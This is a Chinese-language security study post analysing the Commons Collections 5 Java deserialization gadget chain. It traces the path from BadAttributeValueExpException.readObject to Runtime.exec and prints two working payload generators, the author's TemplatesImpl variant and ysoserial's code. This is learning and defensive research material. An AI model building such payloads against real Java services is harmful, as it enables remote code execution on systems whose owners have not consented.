---
title: "Java反序列化利用链学习 - CommonCollection5"
date: 2022-05-04T17:21:00+08:00
lastmod: 2022-05-05T17:22:00+08:00
draft: false
lightgallery: true
categories: [
    "Java Security",
]
tags: [
    "deserialiaztion",
    "java",
    "common collection",
]
---
## Java反序列化利用链系列

* [Java反序列化利用链 - CommonCollection1](commoncollection1.md)
* [Java反序列化利用链 - CommonCollection2](commoncollection2.md)
* [Java反序列化利用链 - CommonCollection3](commoncollection3.md)
* [Java反序列化利用链 - CommonCollection4](commoncollection4.md)
* [Java反序列化利用链 - CommonCollection5](commoncollection5.md)
* [Java反序列化利用链 - CommonCollection6](commoncollection6.md)
* [Java反序列化利用链 - CommonCollection7](commoncollection7.md)

## Java反序列化利用链 - CommonCollection5

### 前置条件

* JDK 8u76
* commons-collections 3.1

这里根据`ysoserial`代码中的描述，该利用链只在`8u76`下可用，且不开启`security manager`。后者的限制没有问题，但是前者似乎不太准确，从[jdk8u_jdk](https://github.com/JetBrains/jdk8u_jdk/)历史版本来看，早于或高于`8u76`的版本中的`/src/share/classes/javax/management/BadAttributeValueExpException.java`也是实现了可利用的`readObject`函数的。测试发现可使用。

### 利用链分析

`CommonCollection5`利用链的调用过程大致如下：

```
Gadget chain:
    ObjectInputStream.readObject()
        BadAttributeValueExpException.readObject()
            TiedMapEntry.toString()
                LazyMap.get()
                    ChainedTransformer.transform()
                        ConstantTransformer.transform()
                        InvokerTransformer.transform()
                            Method.invoke()
                                Class.getMethod()
                        InvokerTransformer.transform()
                            Method.invoke()
                                Runtime.getRuntime()
                        InvokerTransformer.transform()
                            Method.invoke()
                                Runtime.exec()
```

这里关注`javax.management.BadAttributeValueExpException`到`org.apache.commons.collections.map.LazyMap`的过程即可，后面与[Java反序列化利用链 - CommonCollection1]({{< relref "commoncollection1/index.md" >}})相似的。`BadAttributeValueExpExceptionreadObject`到内容如下

```java
private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException {
    ObjectInputStream.GetField gf = ois.readFields();
    Object valObj = gf.get("val", null);

    if (valObj == null) {
        val = null;
    } else if (valObj instanceof String) {
        val= valObj;
    } else if (System.getSecurityManager() == null
            || valObj instanceof Long
            || valObj instanceof Integer
            || valObj instanceof Float
            || valObj instanceof Double
            || valObj instanceof Byte
            || valObj instanceof Short
            || valObj instanceof Boolean) {
        val = valObj.toString();
    } else { // the serialized object is from a version without JDK-8019292 fix
        val = System.identityHashCode(valObj) + "@" + valObj.getClass().getName();
    }
}
```

从`BadAttributeValueExpException#readObject`来看，只要`val`符合前两个条件，且未配置`security manager`即可进入`org.apache.commons.collections.keyvalue.TiedMapEntry#toString`方法

```java
public String toString() {
    return getKey() + "=" + getValue();
}
```

而`getValue`又会导致`LazyMap.get()`的调用，从而一步步触发至命令执行。

在构造利用链时需要注意的是，在构造`BadAttributeValueExpException`对象时，它的`val`成员的值需要通过反射机制来设置。因为构造函数中会调用`toString`方法将它变为`String`类型，
从而导致`readObject`无法执行至需要的地方。

```java
public BadAttributeValueExpException (Object val) {
    this.val = val == null ? null : val.toString();
}
```

此外除了采用`ChainedTransformer`来调用`Runtime.getRuntim().exec()`之外，后半部分也可以使用前面遇到的`TrAXFilter+TemplateImpl`利用链。代码如下

```java
public Object getObject(String command) throws Exception {
    Object template = Gadget.createTemplateImplGadget("open /System/Applications/Calculator.app");

    ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]{
            new ConstantTransformer(TrAXFilter.class),
            new InstantiateTransformer(
                    new Class[] {Templates.class},
                    new Object[]{template})
    });

    LazyMap lazyMap = (LazyMap) LazyMap.decorate(new HashMap(), chainedTransformer);

    TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, 1);

    BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);
    Reflections.setFieldValue(badAttributeValueExpException, "val", tiedMapEntry);

    return badAttributeValueExpException;
}
```

`ysoserial`中的相关代码如下

```java
public BadAttributeValueExpException getObject(final String command) throws Exception {
    final String[] execArgs = new String[] { command };
    // inert chain for setup
    final Transformer transformerChain = new ChainedTransformer(
            new Transformer[]{ new ConstantTransformer(1) });
    // real chain for after setup
    final Transformer[] transformers = new Transformer[] {
            new ConstantTransformer(Runtime.class),
            new InvokerTransformer("getMethod", new Class[] {
                String.class, Class[].class }, new Object[] {
                "getRuntime", new Class[0] }),
            new InvokerTransformer("invoke", new Class[] {
                Object.class, Object[].class }, new Object[] {
                null, new Object[0] }),
            new InvokerTransformer("exec",
                new Class[] { String.class }, execArgs),
            new ConstantTransformer(1) };

    final Map innerMap = new HashMap();

    final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);

    TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo");

    BadAttributeValueExpException val = new BadAttributeValueExpException(null);
    Field valfield = val.getClass().getDeclaredField("val");
    Reflections.setAccessible(valfield);
    valfield.set(val, entry);

    Reflections.setFieldValue(transformerChain, "iTransformers", transformers); // arm with actual transformer chain

    return val;
}
```

## References

1. <https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections4.java>
